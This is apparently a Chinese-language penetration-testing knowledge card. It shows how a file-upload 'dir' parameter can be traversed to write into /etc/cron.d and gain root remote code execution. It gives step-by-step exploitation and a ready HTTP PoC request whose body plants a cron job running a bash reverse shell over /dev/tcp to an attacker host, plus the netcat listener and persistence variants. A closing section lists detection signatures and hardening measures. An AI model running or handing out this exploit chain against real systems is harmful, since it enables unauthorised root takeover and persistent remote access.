---
id: web-generic-file-upload-crond-path-traversal-rce
title: 上传目录参数路径穿越写入 /etc/cron.d：cron 自动加载实现 root RCE
type: scenario
domain: web
path: web/generic/file-upload
technique: upload-path-traversal-crond-rce
aliases:
- 文件发布路径穿越
- 上传到 /etc/cron.d
- cron.d 上传 RCE
- 定时任务反弹 shell
- 任意文件上传 + cron
tags:
- web
- file-upload
- path-traversal
- cron
- rce
- linux
- persistence
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V213
  verified_at: '2026-11-07T04:23:28+08:00'
  notes: 已对照原文与 img/02、03、04、05 核对：dir 与文件名直接拼接后 shutil.move、dir=//xxx/../../../../etc/cron.d、filename=root7、*/1 cron 行与 uid=0 回显一致；保留。
---

## 一句话结论

上传/文件发布接口把用户可控的 `dir` 和文件名直接拼到发布根目录后 `shutil.move`，用 `//../../../../etc/cron.d` 跳出发布目录，把内容为 cron 行的文件写入 `/etc/cron.d/`；cron 会自动加载该目录并按计划执行，攻击者由此获得以 root 运行的命令执行与反弹 Shell。

## 原理

- 漏洞代码把 `directory = request.REQUEST.get('dir', '/')` 直接拼到 `get_publish_root_path()` 后面，再把上传文件 `shutil.move` 到 `root_dir + '/' + filename`，没有做 `realpath`/规范化/白名单校验。
- 攻击者在 `dir` 中放入 `//xxx/../../../../etc/cron.d`（`//xxx` 是应用中已存在的目录，用于让路径先落在合法目录再向上跳），即可从发布目录穿越到系统 cron 配置目录。
- `/etc/cron.d/` 下的文件由 cron 服务自动加载，文件内容遵循 crontab 格式（`分 时 日 月 周 用户 命令`）。把上传文件命名为不含点号的普通文件名（文章用 `root7`），内容写成 `*/1 * * * * root /bin/bash -i >& /dev/tcp/attacker/9988 0>&1`，cron 每分钟以 root 执行一次。
- 前提是 Web 应用以 root 运行，或运行账户对 `/etc/cron.d` 有写权限；文章目标是一个以 root 运行的安全设备管理后台，因此上传后直接拿到 root Shell。
- 这条链把“任意文件上传”从写 WebShell 升级为“滥用系统合法定时任务机制”：即使上传目录不可通过 Web 访问，也能通过 cron 执行。

## 触发条件

- 上传/文件发布接口可控 `dir`（上传目录）和 `filename`，且未做路径规范化/白名单校验。
- Web 应用运行账户对 `/etc/cron.d` 有写权限（常见于以 root 运行的安全设备/运维系统）。
- cron 服务正在运行并加载 `/etc/cron.d`；文件内容符合 crontab 语法。
- 攻击者已获得上传权限（文章通过用户手册中的默认 admin 弱口令进入后台）。

## 利用步骤

1. 登录目标后台，找到“文件发布/上传”功能，确认请求中有 `dir`、`filename` 等可控参数。
2. 构造 `dir=//<已有目录>/../../../../etc/cron.d`，用 `../` 数量从发布根目录跳到 `/etc/cron.d`。
3. 上传文件，文件名使用不含点号的普通名字（如 `root7`），内容为 cron 行：
   `*/1 * * * * root /bin/bash -i >& /dev/tcp/attacker/9988 0>&1`
4. 在攻击机监听对应端口，等待 cron 触发；收到 root Shell 后执行 `id` 验证。
5. 若需要更隐蔽，可写入 DNSLog/HTTP 探测命令先验证执行，再换反弹 Shell。

## PoC

Burp 中的上传请求（文章形态）：

```http
POST /<upload-path>?dir=//xxx/../../../../etc/cron.d HTTP/1.1
Host: victim
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

------WebKitFormBoundary...
Content-Disposition: form-data; name="file"; filename="root7"
Content-Type: image/jpeg

*/1 * * * * root /bin/bash -i >& /dev/tcp/attacker/9988 0>&1
------WebKitFormBoundary...--
```

监听与验证：

```bash
nc -lvnp 9988
# 收到连接后
id   # uid=0(root) gid=0(root) groups=0(root)
```

## 变体与关联

- 变体：写入 `/var/spool/cron/crontabs/<user>`、`/etc/cron.hourly/`、systemd timer、`authorized_keys`、Web 根目录 WebShell 等。
- 变体：Windows 目标可写计划任务目录/启动目录，或利用 `schtasks` 配置。
- 关联：[[web-generic-file-upload-zip-slip-webshell-write]]（Zip Slip 任意文件写，本卡是上传路径穿越 + cron 执行）。
- 关联：[[web-generic-file-upload-7zip-cve-2025-55188-symlink-cron-rce]]（7-Zip 符号链接写 cron，同样是文件写 → cron RCE）。
- 关联：[[pentest-persistence-linux-cron-reverse-shell]]（拿到写权限后的 cron 持久化写法）。
- 边界：应用以低权限运行且对 `/etc/cron.d` 无写权限、上传路径被 `realpath` 限制在根目录内、cron 服务被禁用时，该链路不成立。

## 检测与防御

- 检测：上传请求的 `dir`/路径参数包含 `../`、绝对路径或 `//`；上传文件名出现在 `/etc/cron.d`、`/var/spool/cron` 等敏感目录；cron 文件出现 `bash -i`、`/dev/tcp`、`nc` 等反弹特征。
- 防御：对上传路径做 `realpath` 规范化并校验必须位于发布根目录内；禁止用户控制文件名/目录，或使用服务端生成的随机名。
- 加固：Web 应用以低权限账户运行；`/etc/cron.d` 等系统目录设置严格权限；文件完整性监控（auditd/inotify）对 cron 目录写入告警；禁用不必要的“文件发布”功能。
